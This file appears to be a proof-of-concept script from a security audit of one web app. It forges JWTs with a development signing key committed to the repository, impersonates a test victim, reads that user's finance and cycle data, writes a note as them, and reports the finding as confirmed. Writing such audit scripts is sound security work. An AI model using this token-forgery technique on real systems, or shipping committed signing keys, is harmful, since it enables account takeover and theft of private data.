// §6 CRITICAL — JWT forgery for ANY user via the committed dev signing key.
// The key `CHANGE_ME_TO_A_LONG_RANDOM_SECRET_IN_PRODUCTION` is committed in
// server/appsettings.json. Anyone with the repo can mint a valid HS256 token for
// an arbitrary `sub` (userId) and read/write that victim's data — no password.
//
// Run: node 01-jwt-forgery.mjs
import { provision, mintToken, api } from '../_lib/provision.mjs'

const line = (s = '') => process.stdout.write(s + '\n')

const victim = await provision({
  email: 'adv.t14.victim@gmail.com', nickname: 'Victim', gender: 'female', studentType: 'student', isWorking: true,
})
line(`[setup] provisioned victim userId=${victim.userId} email=${victim.email}`)

// Attacker never saw the victim's password or real token. They only know (or guess)
// the numeric userId and sign a token with the committed key.
const forged = mintToken(victim.userId, 'attacker@gmail.com')
line(`[attack] forged token for sub=${victim.userId} signed with committed key`)

// 1) /api/auth/me — does the server accept the forged identity?
const me = await api('GET', '/api/auth/me', { token: forged })
line(`\n/api/auth/me          -> ${me.status}  ${me.text}`)

// 2) Read the victim's actual private data with the forged token.
const fin = await api('GET', '/api/finance', { token: forged })
line(`/api/finance          -> ${fin.status}  ${JSON.stringify(fin.json)?.slice(0, 120)}`)

const cycle = await api('GET', '/api/cycle', { token: forged })
line(`/api/cycle            -> ${cycle.status}`)

// 3) Write as the victim (mutate their data).
const note = await api('POST', '/api/notes', { token: forged, body: { text: 'PWNED-by-forged-token' } })
line(`POST /api/notes       -> ${note.status}  ${note.text?.slice(0, 80)}`)

const confirmed = me.status === 200 && me.json?.email === victim.email
line('\n==============================================================')
line(`VERDICT: ${confirmed ? 'CONFIRMED 🔴' : 'NOT reproduced'}`)
line(`  expected: forged token (wrong/unknown key) rejected with 401`)
line(`  observed: /me returned ${me.status} and resolved to the victim account`)
line(`            (email in response = ${me.json?.email})`)
line('  -> Any account is fully impersonatable by userId alone.')
